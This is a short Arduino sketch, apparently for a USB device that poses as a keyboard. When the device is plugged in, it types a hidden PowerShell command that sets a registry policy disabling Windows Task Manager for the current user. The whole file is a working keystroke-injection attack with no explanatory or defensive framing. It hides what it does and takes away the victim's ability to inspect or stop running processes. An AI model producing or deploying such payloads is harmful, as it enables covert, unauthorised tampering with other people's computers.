#include <Keyboard.h>

void setup() {
  delay(2000);
  Keyboard.begin();
  delay(500);

  Keyboard.println("powershell -WindowStyle Hidden");
  delay(1000);
  Keyboard.println("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 1");
  Keyboard.end();
}

void loop() {
  // Do nothing
}
